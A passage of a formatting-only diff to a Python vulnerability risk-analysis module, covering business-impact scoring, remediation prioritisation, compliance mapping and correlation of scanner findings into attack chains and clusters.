\"HIGH\"\n@@ -565,389 +624,503 @@\n             risk_level = \"MEDIUM\"\n         elif risk_score >= 20:\n             risk_level = \"LOW\"\n         else:\n             risk_level = \"MINIMAL\"\n-        \n+\n         return {\n             \"total_score\": round(risk_score, 1),\n             \"business_impact\": round(business_impact, 1),\n             \"likelihood\": round(likelihood, 1),\n             \"risk_level\": risk_level,\n-            \"impact_multiplier\": round(impact_multiplier, 2)\n-        }\n-    \n-    def _calculate_vector_distribution(self, vector_groups: Dict[AttackVector, List[VulnerabilityContext]]) -> Dict[str, Any]:\n+            \"impact_multiplier\": round(impact_multiplier, 2),\n+        }\n+\n+    def _calculate_vector_distribution(\n+        self, vector_groups: Dict[AttackVector, List[VulnerabilityContext]]\n+    ) -> Dict[str, Any]:\n         \"\"\"Calculate attack vector distribution\"\"\"\n         total_vulns = sum(len(vulns) for vulns in vector_groups.values())\n-        \n+\n         if total_vulns == 0:\n             return {}\n-        \n+\n         distribution = {}\n         for vector, vulns in vector_groups.items():\n             distribution[vector.value] = {\n                 \"count\": len(vulns),\n                 \"percentage\": round((len(vulns) / total_vulns) * 100, 1),\n-                \"risk_score\": sum(v.cvss_score for v in vulns) / len(vulns) if vulns else 0\n+                \"risk_score\": (\n+                    sum(v.cvss_score for v in vulns) / len(vulns) if vulns else 0\n+                ),\n             }\n-        \n+\n         return distribution\n-    \n-    def _identify_critical_attack_paths(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _identify_critical_attack_paths(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Identify critical attack paths\"\"\"\n         paths = []\n-        \n+\n         # Group by target\n         target_groups = defaultdict(list)\n         for vuln in vulnerabilities:\n             target_groups[vuln.target].append(vuln)\n-        \n+\n         for target, vulns in target_groups.items():\n             # Find high-impact paths\n-            high_impact_vulns = [v for v in vulns if v.business_impact >= 7.0 and v.exploitability >= 0.6]\n-            \n+            high_impact_vulns = [\n+                v for v in vulns if v.business_impact >= 7.0 and v.exploitability >= 0.6\n+            ]\n+\n             if high_impact_vulns:\n                 path = {\n                     \"target\": target,\n-                    \"path_risk\": max(v.business_impact * v.exploitability for v in high_impact_vulns),\n+                    \"path_risk\": max(\n+                        v.business_impact * v.exploitability for v in high_impact_vulns\n+                    ),\n                     \"vulnerabilities\": [v.template_id for v in high_impact_vulns],\n-                    \"estimated_effort\": \"Low\" if any(v.exploitability > 0.8 for v in high_impact_vulns) else \"Medium\",\n-                    \"potential_impact\": \"High\" if any(v.business_impact > 8.0 for v in high_impact_vulns) else \"Medium\"\n+                    \"estimated_effort\": (\n+                        \"Low\"\n+                        if any(v.exploitability > 0.8 for v in high_impact_vulns)\n+                        else \"Medium\"\n+                    ),\n+                    \"potential_impact\": (\n+                        \"High\"\n+                        if any(v.business_impact > 8.0 for v in high_impact_vulns)\n+                        else \"Medium\"\n+                    ),\n                 }\n                 paths.append(path)\n-        \n+\n         return sorted(paths, key=lambda p: p[\"path_risk\"], reverse=True)[:5]\n-    \n-    def _estimate_time_to_compromise(self, vulnerabilities: List[VulnerabilityContext]) -> str:\n+\n+    def _estimate_time_to_compromise(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> str:\n         \"\"\"Estimate time to compromise based on vulnerability characteristics\"\"\"\n         if not vulnerabilities:\n             return \"N/A\"\n-        \n+\n         # Find fastest attack path\n         min_complexity = min(v.remediation_complexity for v in vulnerabilities)\n         max_exploitability = max(v.exploitability for v in vulnerabilities)\n-        \n+\n         if max_exploitability > 0.8 and min_complexity <= 2:\n             return \"Minutes to Hours\"\n         elif max_exploitability > 0.6 and min_complexity <= 3:\n             return \"Hours to Days\"\n         elif max_exploitability > 0.4:\n             return \"Days to Weeks\"\n         else:\n             return \"Weeks to Months\"\n-    \n-    def _calculate_remediation_priority(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _calculate_remediation_priority(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Calculate remediation priority\"\"\"\n         priority_list = []\n-        \n+\n         for vuln in vulnerabilities:\n             priority_score = (\n-                vuln.business_impact * 0.4 +\n-                vuln.exploitability * 10.0 * 0.3 +\n-                (6 - vuln.remediation_complexity) * 2.0 * 0.2 +\n-                vuln.confidence * 10.0 * 0.1\n-            )\n-            \n-            priority_list.append({\n-                \"vulnerability_id\": vuln.id,\n-                \"template_id\": vuln.template_id,\n-                \"target\": vuln.target,\n-                \"priority_score\": round(priority_score, 2),\n-                \"estimated_effort\": self._effort_mapping(vuln.remediation_complexity),\n-                \"business_justification\": self._generate_business_justification(vuln)\n-            })\n-        \n+                vuln.business_impact * 0.4\n+                + vuln.exploitability * 10.0 * 0.3\n+                + (6 - vuln.remediation_complexity) * 2.0 * 0.2\n+                + vuln.confidence * 10.0 * 0.1\n+            )\n+\n+            priority_list.append(\n+                {\n+                    \"vulnerability_id\": vuln.id,\n+                    \"template_id\": vuln.template_id,\n+                    \"target\": vuln.target,\n+                    \"priority_score\": round(priority_score, 2),\n+                    \"estimated_effort\": self._effort_mapping(\n+                        vuln.remediation_complexity\n+                    ),\n+                    \"business_justification\": self._generate_business_justification(\n+                        vuln\n+                    ),\n+                }\n+            )\n+\n         return sorted(priority_list, key=lambda x: x[\"priority_score\"], reverse=True)\n-    \n+\n     def _effort_mapping(self, complexity: int) -> str:\n         \"\"\"Map complexity to effort estimate\"\"\"\n         mapping = {1: \"Low\", 2: \"Low-Medium\", 3: \"Medium\", 4: \"Medium-High\", 5: \"High\"}\n         return mapping.get(complexity, \"Medium\")\n-    \n+\n     def _generate_business_justification(self, vuln: VulnerabilityContext) -> str:\n         \"\"\"Generate business justification for remediation\"\"\"\n         if vuln.business_impact >= 8.0:\n             return f\"Critical business asset exposure with potential revenue impact of ${self.business_context.revenue_impact_per_hour:.0f}/hour\"\n         elif vuln.business_impact >= 6.0:\n             return f\"High business impact affecting {vuln.attack_vector.value} security\"\n         elif vuln.exploitability >= 0.8:\n             return \"High exploitability with available attack tools\"\n         else:\n             return \"Reduces overall security posture\"\n-    \n-    def _assess_compliance_impact(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _assess_compliance_impact(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Assess compliance impact\"\"\"\n         compliance_impact = []\n-        \n+\n         # Check against common compliance requirements\n         for compliance in self.business_context.compliance_requirements:\n             affected_vulns = []\n-            \n+\n             for vuln in vulnerabilities:\n                 if self._affects_compliance(vuln, compliance):\n                     affected_vulns.append(vuln.template_id)\n-            \n+\n             if affected_vulns:\n-                compliance_impact.append({\n-                    \"framework\": compliance,\n-                    \"affected_vulnerabilities\": affected_vulns,\n-                    \"severity\": \"High\" if len(affected_vulns) > 5 else \"Medium\",\n-                    \"potential_violations\": self._get_potential_violations(compliance, affected_vulns)\n-                })\n-        \n+                compliance_impact.append(\n+                    {\n+                        \"framework\": compliance,\n+                        \"affected_vulnerabilities\": affected_vulns,\n+                        \"severity\": \"High\" if len(affected_vulns) > 5 else \"Medium\",\n+                        \"potential_violations\": self._get_potential_violations(\n+                            compliance, affected_vulns\n+                        ),\n+                    }\n+                )\n+\n         return compliance_impact\n-    \n+\n     def _affects_compliance(self, vuln: VulnerabilityContext, compliance: str) -> bool:\n         \"\"\"Check if vulnerability affects compliance\"\"\"\n         compliance_mappings = {\n             \"GDPR\": [\"data\", \"leak\", \"exposure\", \"privacy\"],\n             \"SOX\": [\"auth\", \"access\", \"financial\", \"audit\"],\n             \"HIPAA\": [\"data\", \"health\", \"privacy\", \"encryption\"],\n-            \"PCI-DSS\": [\"payment\", \"card\", \"crypto\", \"ssl\", \"tls\"]\n-        }\n-        \n+            \"PCI-DSS\": [\"payment\", \"card\", \"crypto\", \"ssl\", \"tls\"],\n+        }\n+\n         keywords = compliance_mappings.get(compliance, [])\n-        return any(keyword in vuln.template_id.lower() or keyword in vuln.description.lower() for keyword in keywords)\n-    \n-    def _get_potential_violations(self, compliance: str, vulnerabilities: List[str]) -> List[str]:\n+        return any(\n+            keyword in vuln.template_id.lower() or keyword in vuln.description.lower()\n+            for keyword in keywords\n+        )\n+\n+    def _get_potential_violations(\n+        self, compliance: str, vulnerabilities: List[str]\n+    ) -> List[str]:\n         \"\"\"Get potential compliance violations\"\"\"\n         violation_mappings = {\n-            \"GDPR\": [\"Article 32 - Security of processing\", \"Article 25 - Data protection by design\"],\n+            \"GDPR\": [\n+                \"Article 32 - Security of processing\",\n+                \"Article 25 - Data protection by design\",\n+            ],\n             \"SOX\": [\"Section 404 - Management assessment of internal controls\"],\n-            \"HIPAA\": [\"Security Rule - Access Control\", \"Security Rule - Transmission Security\"],\n-            \"PCI-DSS\": [\"Requirement 6 - Secure Systems\", \"Requirement 4 - Encrypt Data\"]\n-        }\n-        \n+            \"HIPAA\": [\n+                \"Security Rule - Access Control\",\n+                \"Security Rule - Transmission Security\",\n+            ],\n+            \"PCI-DSS\": [\n+                \"Requirement 6 - Secure Systems\",\n+                \"Requirement 4 - Encrypt Data\",\n+            ],\n+        }\n+\n         return violation_mappings.get(compliance, [\"General security requirements\"])\n-    \n-    def _generate_risk_insights(self, vulnerabilities: List[VulnerabilityContext], risk_context: Dict[str, Any]) -> List[str]:\n+\n+    def _generate_risk_insights(\n+        self, vulnerabilities: List[VulnerabilityContext], risk_context: Dict[str, Any]\n+    ) -> List[str]:\n         \"\"\"Generate intelligent risk insights\"\"\"\n         insights = []\n-        \n+\n         if not vulnerabilities:\n-            insights.append(\"\ud83d\udfe2 No vulnerabilities detected - maintain current security posture\")\n+            insights.append(\n+                \"\ud83d\udfe2 No vulnerabilities detected - maintain current security posture\"\n+            )\n             return insights\n-        \n+\n         # Attack surface analysis\n         unique_targets = len(set(v.target for v in vulnerabilities))\n         if unique_targets > 5:\n-            insights.append(f\"\ud83d\udd0d Large attack surface detected: {unique_targets} unique targets identified\")\n-        \n+            insights.append(\n+                f\"\ud83d\udd0d Large attack surface detected: {unique_targets} unique targets identified\"\n+            )\n+\n         # Critical vulnerability insights\n-        critical_vulns = [v for v in vulnerabilities if v.severity.lower() == \"critical\"]\n+        critical_vulns = [\n+            v for v in vulnerabilities if v.severity.lower() == \"critical\"\n+        ]\n         if critical_vulns:\n-            insights.append(f\"\ud83d\udea8 CRITICAL: {len(critical_vulns)} critical vulnerabilities require immediate attention\")\n-        \n+            insights.append(\n+                f\"\ud83d\udea8 CRITICAL: {len(critical_vulns)} critical vulnerabilities require immediate attention\"\n+            )\n+\n         # Exploitability insights\n         highly_exploitable = [v for v in vulnerabilities if v.exploitability > 0.8]\n         if highly_exploitable:\n-            insights.append(f\"\u26a1 {len(highly_exploitable)} vulnerabilities are highly exploitable with available tools\")\n-        \n+            insights.append(\n+                f\"\u26a1 {len(highly_exploitable)} vulnerabilities are highly exploitable with available tools\"\n+            )\n+\n         # Attack vector concentration\n         vector_counts = Counter(v.attack_vector for v in vulnerabilities)\n         dominant_vector = vector_counts.most_common(1)[0]\n         if dominant_vector[1] > len(vulnerabilities) * 0.6:\n-            insights.append(f\"\ud83c\udfaf Attack surface concentrated in {dominant_vector[0].value} ({dominant_vector[1]} vulnerabilities)\")\n-        \n+            insights.append(\n+                f\"\ud83c\udfaf Attack surface concentrated in {dominant_vector[0].value} ({dominant_vector[1]} vulnerabilities)\"\n+            )\n+\n         # Business impact insights\n         high_impact_vulns = [v for v in vulnerabilities if v.business_impact >= 7.0]\n         if high_impact_vulns:\n-            insights.append(f\"\ud83d\udcbc {len(high_impact_vulns)} vulnerabilities pose significant business risk\")\n-        \n+            insights.append(\n+                f\"\ud83d\udcbc {len(high_impact_vulns)} vulnerabilities pose significant business risk\"\n+            )\n+\n         # Remediation insights\n         easy_fixes = [v for v in vulnerabilities if v.remediation_complexity <= 2]\n         if easy_fixes:\n-            insights.append(f\"\ud83d\udd27 {len(easy_fixes)} vulnerabilities can be quickly remediated with low effort\")\n-        \n+            insights.append(\n+                f\"\ud83d\udd27 {len(easy_fixes)} vulnerabilities can be quickly remediated with low effort\"\n+            )\n+\n         return insights\n-    \n-    def _generate_contextual_recommendations(self, vulnerabilities: List[VulnerabilityContext], risk_context: Dict[str, Any]) -> List[str]:\n+\n+    def _generate_contextual_recommendations(\n+        self, vulnerabilities: List[VulnerabilityContext], risk_context: Dict[str, Any]\n+    ) -> List[str]:\n         \"\"\"Generate contextual recommendations\"\"\"\n         recommendations = []\n-        \n+\n         if not vulnerabilities:\n-            recommendations.extend([\n-                \"\u2705 Continue regular security monitoring and assessments\",\n-                \"\ud83d\udd04 Maintain current security controls and configurations\",\n-                \"\ud83d\udcca Schedule next assessment in 30-60 days\"\n-            ])\n+            recommendations.extend(\n+                [\n+                    \"\u2705 Continue regular security monitoring and assessments\",\n+                    \"\ud83d\udd04 Maintain current security controls and configurations\",\n+                    \"\ud83d\udcca Schedule next assessment in 30-60 days\",\n+                ]\n+            )\n             return recommendations\n-        \n+\n         # Immediate actions for critical vulnerabilities\n-        critical_vulns = [v for v in vulnerabilities if v.severity.lower() == \"critical\"]\n+        critical_vulns = [\n+            v for v in vulnerabilities if v.severity.lower() == \"critical\"\n+        ]\n         if critical_vulns:\n-            recommendations.append(\"\ud83d\udea8 IMMEDIATE: Address all critical vulnerabilities within 24 hours\")\n-            recommendations.append(\"\ud83d\udd12 Consider blocking affected services until patched\")\n-        \n+            recommendations.append(\n+                \"\ud83d\udea8 IMMEDIATE: Address all critical vulnerabilities within 24 hours\"\n+            )\n+            recommendations.append(\n+                \"\ud83d\udd12 Consider blocking affected services until patched\"\n+            )\n+\n         # High-priority remediation\n         high_vulns = [v for v in vulnerabilities if v.severity.lower() == \"high\"]\n         if high_vulns:\n-            recommendations.append(\"\ud83d\udd34 HIGH PRIORITY: Remediate high-severity vulnerabilities within 48-72 hours\")\n-        \n+            recommendations.append(\n+                \"\ud83d\udd34 HIGH PRIORITY: Remediate high-severity vulnerabilities within 48-72 hours\"\n+            )\n+\n         # Attack vector specific recommendations\n         vector_counts = Counter(v.attack_vector for v in vulnerabilities)\n-        \n+\n         if AttackVector.WEB_APPLICATION in vector_counts:\n-            recommendations.append(\"\ud83c\udf10 Implement Web Application Firewall (WAF) for immediate protection\")\n-            recommendations.append(\"\ud83d\udd0d Conduct thorough code review and implement secure coding practices\")\n-        \n+            recommendations.append(\n+                \"\ud83c\udf10 Implement Web Application Firewall (WAF) for immediate protection\"\n+            )\n+            recommendations.append(\n+                \"\ud83d\udd0d Conduct thorough code review and implement secure coding practices\"\n+            )\n+\n         if AttackVector.NETWORK in vector_counts:\n             recommendations.append(\"\ud83d\udee1\ufe0f Review network segmentation and firewall rules\")\n-            recommendations.append(\"\ud83d\udd10 Implement network access controls and monitoring\")\n-        \n+            recommendations.append(\n+                \"\ud83d\udd10 Implement network access controls and monitoring\"\n+            )\n+\n         if AttackVector.CONFIGURATION in vector_counts:\n             recommendations.append(\"\u2699\ufe0f Conduct configuration hardening review\")\n-            recommendations.append(\"\ud83d\udccb Implement configuration management and compliance monitoring\")\n-        \n+            recommendations.append(\n+                \"\ud83d\udccb Implement configuration management and compliance monitoring\"\n+            )\n+\n         # Business context recommendations\n         if risk_context[\"business_impact\"] > 60:\n-            recommendations.append(\"\ud83d\udcbc Engage business stakeholders for risk acceptance decisions\")\n-            recommendations.append(\"\ud83d\udcca Consider cyber insurance review given high business impact\")\n-        \n+            recommendations.append(\n+                \"\ud83d\udcbc Engage business stakeholders for risk acceptance decisions\"\n+            )\n+            recommendations.append(\n+                \"\ud83d\udcca Consider cyber insurance review given high business impact\"\n+            )\n+\n         # Compliance recommendations\n         if self.business_context.compliance_requirements:\n-            recommendations.append(f\"\ud83d\udcdc Review remediation plan against {', '.join(self.business_context.compliance_requirements)} requirements\")\n-        \n+            recommendations.append(\n+                f\"\ud83d\udcdc Review remediation plan against {', '.join(self.business_context.compliance_requirements)} requirements\"\n+            )\n+\n         # Long-term strategic recommendations\n-        recommendations.extend([\n-            \"\ud83d\udd04 Implement continuous security monitoring\",\n-            \"\ud83d\udc65 Provide security awareness training\",\n-            \"\ud83d\udcc8 Establish security metrics and KPIs\",\n-            \"\ud83c\udfd7\ufe0f Integrate security into development lifecycle\"\n-        ])\n-        \n+        recommendations.extend(\n+            [\n+                \"\ud83d\udd04 Implement continuous security monitoring\",\n+                \"\ud83d\udc65 Provide security awareness training\",\n+                \"\ud83d\udcc8 Establish security metrics and KPIs\",\n+                \"\ud83c\udfd7\ufe0f Integrate security into development lifecycle\",\n+            ]\n+        )\n+\n         return recommendations\n \n \n class VulnerabilityCorrelationEngine:\n     \"\"\"Advanced vulnerability correlation and relationship analysis\"\"\"\n-    \n+\n     def __init__(self):\n         self.logger = logging.getLogger(__name__)\n         self.correlation_rules = self._initialize_correlation_rules()\n-    \n+\n     def _initialize_correlation_rules(self) -> Dict[str, List[Dict[str, Any]]]:\n         \"\"\"Initialize vulnerability correlation rules\"\"\"\n         return {\n             \"attack_chains\": [\n                 {\n                     \"name\": \"Web Application RCE Chain\",\n                     \"pattern\": [\"upload\", \"lfi\", \"rce\"],\n-                    \"description\": \"File upload leading to local file inclusion and remote code execution\"\n+                    \"description\": \"File upload leading to local file inclusion and remote code execution\",\n                 },\n                 {\n                     \"name\": \"Authentication Bypass Chain\",\n                     \"pattern\": [\"auth-bypass\", \"privilege\", \"admin\"],\n-                    \"description\": \"Authentication bypass leading to privilege escalation\"\n+                    \"description\": \"Authentication bypass leading to privilege escalation\",\n                 },\n                 {\n                     \"name\": \"SQL Injection Chain\",\n                     \"pattern\": [\"sqli\", \"dump\", \"privilege\"],\n-                    \"description\": \"SQL injection leading to database compromise\"\n-                }\n+                    \"description\": \"SQL injection leading to database compromise\",\n+                },\n             ],\n             \"amplification_patterns\": [\n                 {\n                     \"primary\": \"xss\",\n                     \"amplifiers\": [\"csrf\", \"clickjacking\"],\n-                    \"description\": \"XSS amplified by CSRF and clickjacking vulnerabilities\"\n+                    \"description\": \"XSS amplified by CSRF and clickjacking vulnerabilities\",\n                 },\n                 {\n                     \"primary\": \"ssrf\",\n                     \"amplifiers\": [\"cloud-metadata\", \"internal-service\"],\n-                    \"description\": \"SSRF amplified by cloud metadata access\"\n-                }\n-            ]\n-        }\n-    \n-    def analyze_correlations(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+                    \"description\": \"SSRF amplified by cloud metadata access\",\n+                },\n+            ],\n+        }\n+\n+    def analyze_correlations(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Analyze correlations between vulnerabilities\"\"\"\n         correlations = {\n             \"attack_chains\": self._find_attack_chains(vulnerabilities),\n             \"vulnerability_clusters\": self._cluster_vulnerabilities(vulnerabilities),\n-            \"amplification_scenarios\": self._find_amplification_scenarios(vulnerabilities),\n+            \"amplification_scenarios\": self._find_amplification_scenarios(\n+                vulnerabilities\n+            ),\n             \"dependency_graph\": self._build_dependency_graph(vulnerabilities),\n-            \"risk_amplification_factor\": self._calculate_risk_amplification(vulnerabilities)\n-        }\n-        \n+            \"risk_amplification_factor\": self._calculate_risk_amplification(\n+                vulnerabilities\n+            ),\n+        }\n+\n         return correlations\n-    \n-    def _find_attack_chains(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _find_attack_chains(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Find potential attack chains\"\"\"\n         chains = []\n-        \n+\n         # Group by target\n         target_groups = defaultdict(list)\n         for vuln in vulnerabilities:\n             target_groups[vuln.target].append(vuln)\n-        \n+\n         for target, vulns in target_groups.items():\n             for rule in self.correlation_rules[\"attack_chains\"]:\n                 chain_vulns = self._match_chain_pattern(vulns, rule[\"pattern\"])\n                 if len(chain_vulns) >= 2:  # Need at least 2 vulnerabilities for a chain\n-                    chains.append({\n-                        \"name\": rule[\"name\"],\n-                        \"target\": target,\n-                        \"vulnerabilities\": [v.template_id for v in chain_vulns],\n-                        \"risk_multiplier\": len(chain_vulns) * 1.5,\n-                        \"description\": rule[\"description\"],\n-                        \"exploitability\": max(v.exploitability for v in chain_vulns)\n-                    })\n-        \n+                    chains.append(\n+                        {\n+                            \"name\": rule[\"name\"],\n+                            \"target\": target,\n+                            \"vulnerabilities\": [v.template_id for v in chain_vulns],\n+                            \"risk_multiplier\": len(chain_vulns) * 1.5,\n+                            \"description\": rule[\"description\"],\n+                            \"exploitability\": max(\n+                                v.exploitability for v in chain_vulns\n+                            ),\n+                        }\n+                    )\n+\n         return sorted(chains, key=lambda c: c[\"risk_multiplier\"], reverse=True)\n-    \n-    def _match_chain_pattern(self, vulnerabilities: List[VulnerabilityContext], pattern: List[str]) -> List[VulnerabilityContext]:\n+\n+    def _match_chain_pattern(\n+        self, vulnerabilities: List[VulnerabilityContext], pattern: List[str]\n+    ) -> List[VulnerabilityContext]:\n         \"\"\"Match vulnerabilities against a chain pattern\"\"\"\n         matched = []\n-        \n+\n         for pattern_item in pattern:\n             for vuln in vulnerabilities:\n                 if pattern_item in vuln.template_id.lower() and vuln not in matched:\n                     matched.append(vuln)\n                     break\n-        \n+\n         return matched\n-    \n-    def _cluster_vulnerabilities(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _cluster_vulnerabilities(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Cluster related vulnerabilities\"\"\"\n         clusters = []\n         processed = set()\n-        \n+\n         for vuln in vulnerabilities:\n             if vuln.id in processed:\n                 continue\n-            \n+\n             cluster = {\n                 \"primary_vulnerability\": vuln.template_id,\n                 \"target\": vuln.target,\n                 \"members\": [vuln],\n                 \"cluster_type\": self._determine_cluster_type(vuln),\n-                \"combined_risk\": vuln.business_impact\n+                \"combined_risk\": vuln.business_impact,\n             }\n-            \n+\n             # Find related vulnerabilities\n             for other_vuln in vulnerabilities:\n                 if other_vuln.id != vuln.id and other_vuln.id not in processed:\n                     if self._are_vulnerabilities_clustered(vuln, other_vuln):\n                         cluster[\"members\"].append(other_vuln)\n-                        cluster[\"combined_risk\"] += other_vuln.business_impact * 0.5  # Diminishing returns\n+                        cluster[\"combined_risk\"] += (\n+                            other_vuln.business_impact * 0.5\n+                        )  # Diminishing returns\n                         processed.add(other_vuln.id)\n-            \n+\n             if len(cluster[\"members\"]) > 1:  # Only include multi-member clusters\n                 cluster[\"member_count\"] = len(cluster[\"members\"])\n-                cluster[\"member_templates\"] = [v.template_id for v in cluster[\"members\"]]\n+                cluster[\"member_templates\"] = [\n+                    v.template_id for v in cluster[\"members\"]\n+                ]\n                 clusters.append(cluster)\n-            \n+\n             processed.add(vuln.id)\n-        \n+\n         return sorted(clusters, key=lambda c: c[\"combined_risk\"], reverse=True)\n-    \n+\n     def _determine_cluster_type(self, vuln: VulnerabilityContext) -> str:\n         \"\"\"Determine the type of vulnerability cluster\"\"\"\n         template_lower = vuln.template_id.lower()\n-        \n+\n         if any(pattern in template_lower for pattern in [\"sqli\", \"sql\"]):\n             return \"SQL_INJECTION_CLUSTER\"\n         elif any(pattern in template_lower for pattern in [\"xss\", \"cross-site\"]):\n             return \"XSS_CLUSTER\"\n         elif any(pattern in template_lower for pattern in [\"auth\", \"session\"]):\n@@ -956,406 +1129,471 @@\n             return \"CONFIGURATION_CLUSTER\"\n         elif any(pattern in template_lower for pattern in [\"ssl\", \"tls\", \"crypto\"]):\n             return \"CRYPTOGRAPHIC_CLUSTER\"\n         else:\n             return \"GENERAL_CLUSTER\"\n-    \n-    def _are_vulnerabilities_clustered(self, vuln1: VulnerabilityContext, vuln2: VulnerabilityContext) -> bool:\n+\n+    def _are_vulnerabilities_clustered(\n+        self, vuln1: VulnerabilityContext, vuln2: VulnerabilityContext\n+    ) -> bool:\n         \"\"\"Check if two vulnerabilities should be clustered\"\"\"\n         # Same target and attack vector\n         if vuln1.target == vuln2.target and vuln1.attack_vector == vuln2.attack_vector:\n             return True\n-        \n+\n         # Similar template patterns\n-        template1_base = re.sub(r'-\\d+$', '', vuln1.template_id.lower())\n-        template2_base = re.sub(r'-\\d+$', '', vuln2.template_id.lower())\n-        \n+        template1_base = re.sub(r\"-\\d+$\", \"\", vuln1.template_id.lower())\n+        template2_base = re.sub(r\"-\\d+$\", \"\", vuln2.template_id.lower())\n+\n         if template1_base == template2_base:\n             return True\n-        \n+\n         # Related vulnerability types\n         related_patterns = [\n             [\"sqli\", \"sql-injection\"],\n             [\"xss\", \"cross-site-scripting\"],\n             [\"rce\", \"code-execution\"],\n             [\"lfi\", \"file-inclusion\"],\n-            [\"auth\", \"authentication\", \"session\"]\n+            [\"auth\", \"authentication\", \"session\"],\n         ]\n-        \n+\n         for pattern_group in related_patterns:\n-            if any(p in vuln1.template_id.lower() for p in pattern_group) and \\\n-               any(p in vuln2.template_id.lower() for p in pattern_group):\n+            if any(p in vuln1.template_id.lower() for p in pattern_group) and any(\n+                p in vuln2.template_id.lower() for p in pattern_group\n+            ):\n                 return True\n-        \n+\n         return False\n-    \n-    def _find_amplification_scenarios(self, vulnerabilities: List[VulnerabilityContext]) -> List[Dict[str, Any]]:\n+\n+    def _find_amplification_scenarios(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> List[Dict[str, Any]]:\n         \"\"\"Find vulnerability amplification scenarios\"\"\"\n         scenarios = []\n-        \n+\n         for rule in self.correlation_rules[\"amplification_patterns\"]:\n-            primary_vulns = [v for v in vulnerabilities if rule[\"primary\"] in v.template_id.lower()]\n-            \n+            primary_vulns = [\n+                v for v in vulnerabilities if rule[\"primary\"] in v.template_id.lower()\n+            ]\n+\n             for primary in primary_vulns:\n                 amplifiers = []\n                 for amplifier_pattern in rule[\"amplifiers\"]:\n                     for vuln in vulnerabilities:\n-                        if (amplifier_pattern in vuln.template_id.lower() and \n-                            vuln.target == primary.target and \n-                            vuln.id != primary.id):\n+                        if (\n+                            amplifier_pattern in vuln.template_id.lower()\n+                            and vuln.target == primary.target\n+                            and vuln.id != primary.id\n+                        ):\n                             amplifiers.append(vuln)\n-                \n+\n                 if amplifiers:\n                     amplification_factor = 1.0 + (len(amplifiers) * 0.3)\n-                    scenarios.append({\n-                        \"primary_vulnerability\": primary.template_id,\n-                        \"target\": primary.target,\n-                        \"amplifiers\": [a.template_id for a in amplifiers],\n-                        \"amplification_factor\": amplification_factor,\n-                        \"description\": rule[\"description\"],\n-                        \"combined_exploitability\": min(primary.exploitability * amplification_factor, 1.0)\n-                    })\n-        \n+                    scenarios.append(\n+                        {\n+                            \"primary_vulnerability\": primary.template_id,\n+                            \"target\": primary.target,\n+                            \"amplifiers\": [a.template_id for a in amplifiers],\n+                            \"amplification_factor\": amplification_factor,\n+                            \"description\": rule[\"description\"],\n+                            \"combined_exploitability\": min(\n+                                primary.exploitability * amplification_factor, 1.0\n+                            ),\n+                        }\n+                    )\n+\n         return scenarios\n-    \n-    def _build_dependency_graph(self, vulnerabilities: List[VulnerabilityContext]) -> Dict[str, Any]:\n+\n+    def _build_dependency_graph(\n+        self, vulnerabilities: List[VulnerabilityContext]\n+    ) -> Dict[str, Any]:\n         \"\"\"Build vulnerability dependency graph\"\"\"\n-        graph = {\n-            \"nodes\": [],\n-            \"edges\": [],\n-            \"critical_paths\": []\n-        }\n-        \n+        graph = {\"nodes\": [], \"edges\": [], \"critical_paths\": []}\n+\n         # Create nodes\n         for vuln in vulnerabilities:\n-            graph[\"nodes\"].append({\n-                \"id\": vuln.id,\n-                \"template_id\": vuln.template_id,\n-                \"target\": vuln.target,\n-                \"severity\": vuln.severity,\n-                \"exploitability\": vuln.exploitability,\n-                \"business_impact\": vuln.business_impact\n-            })\n-        \n+            graph[\"nodes\"].append(\n+                {\n+                    \"id\": vuln.id,\n+                    \"template_id\": vuln.template_id,\n+                    \"target\": vuln.target,\n+                    \"severity\": vuln.severity,\n+                    \"exploitability\": vuln.exploitability,\n+                    \"business_impact\": vuln.business_impact,\n+                }\n+            )\n+\n         # Create edges based on relationships\n         for i, vuln1 in enumerate(vulnerabilities):\n             for j, vuln2 in enumerate(vulnerabilities):\n                 if i != j:\n                     relationship = self._determine_relationship(vuln1, vuln2)\n                     if relationship:\n-                        graph[\"edges\"].append({\n-                            \"source\": vuln1.id,\n-                            \"target\": vuln2.id,\n-                            \"relationship\": relationship,\n-                            \"weight\": self._calculate_relationship_weight(vuln1, vuln2, relationship)\n-                        })\n-        \n+                        graph[\"edges\"].append(\n+                            {\n+                                \"source\": vuln1.id,\n+                                \"target\": vuln2.id,\n+                                \"relationship\": relationship,\n+                                \"weight\": self._calculate_relationship_weight(\n+                                    vuln1, vuln2, relationship\n+                                ),\n+                            }\n+                        )\n+\n         # Find critical paths (simplified)\n         graph[\"critical_paths\"] = self._find_critical_paths(vulnerabilities)\n-        \n+\n         return graph\n-    \n-    def _determine_relationship(self, vuln1: VulnerabilityContext, vuln2: VulnerabilityContext) -> Optional[str]:\n+\n+    def _determine_relationship(\n+        self, vuln1: VulnerabilityContext, vuln2: VulnerabilityContext\n+    ) -> Optional[str]:\n         \"\"\"Determine relationship between two vulnerabilities\"\"\"\n         # Prerequisites (one enables the other)\n         prerequisite_patterns = [\n             ([\"auth-bypass\"], [\"privilege\", \"admin\"]),\n             ([\"upload\"], [\"rce\", \"lfi\"]),\n             ([\"sqli\"], [\"dump\", \"privilege\"]),\n-            ([\"xss\"], [\"csrf\", \"session\"])\n+            ([\"xss\"], [\"csrf\", \"session\"]),\n         ]\n-        \n+\n         for prereq, enabled in 